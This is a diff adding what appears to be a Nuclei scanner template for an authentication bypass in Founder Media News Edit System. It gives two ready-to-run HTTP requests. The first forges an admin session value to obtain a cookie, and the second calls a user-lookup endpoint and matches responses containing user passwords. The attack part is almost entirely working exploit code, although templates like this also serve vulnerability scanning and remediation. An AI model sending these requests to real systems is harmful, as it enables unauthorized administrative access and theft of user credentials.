@@ -1,0 +1,58 @@
+id: founder-media-news-edit-system-logical-bypass
+
+info:
+  name: Founder Media News Edit System Authentication Bypass
+  author: onewin
+  severity: high
+  description: Founder Media News Edit System contains an authentication bypass vulnerability. Improper trust of user-controlled session-related data may allow unauthorized access to privileged application functions.
+  impact: Successful exploitation may allow attackers to access sensitive user information, enumerate accounts, perform unauthorized operations, and compromise the confidentiality and integrity of the affected system.
+  remediation: Implement server-side session validation, remove trust in client-controlled authentication attributes, enforce strict authentication and authorization checks, and upgrade to a patched version provided by the vendor.
+  reference:
+    - https://www.founder.com/
+  metadata:
+    vendor: founder
+    product: media_news_edit_system
+    max-request: 2
+  tags: FOUNDER-全媒体采编系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: get-cookie
+    raw:
+      - |
+        POST /newsedit/api/stub/getRemotePapers.do?siteCode=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Session_SysUser=1%2C127.0.0.1%2C1%2C1%2C1%2Cadmin%2Csysadmin%2Clocalhost
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        group: 1
+        regex:
+          - "Set-Cookie: ([^;]+);"
+        internal: true
+
+  - id: auth-bypass
+    raw:
+      - |
+        POST /newsedit/newsedit/userSearch/getUser.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{session_cookie}}
+
+        UUID=adminUser&Session_ProcParam=a=1,a=0,a=1,a=1,a=-9999,a=sysadmin,a=0,a=admin,a=2024-06-11%2011:11:11:000,a=1,a=1&DocIDs=1&DocLibID=1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "userPassword"
+          - "userCode"
+        part: body
+        condition: and
+      - type: status
+        status:
+          - 200
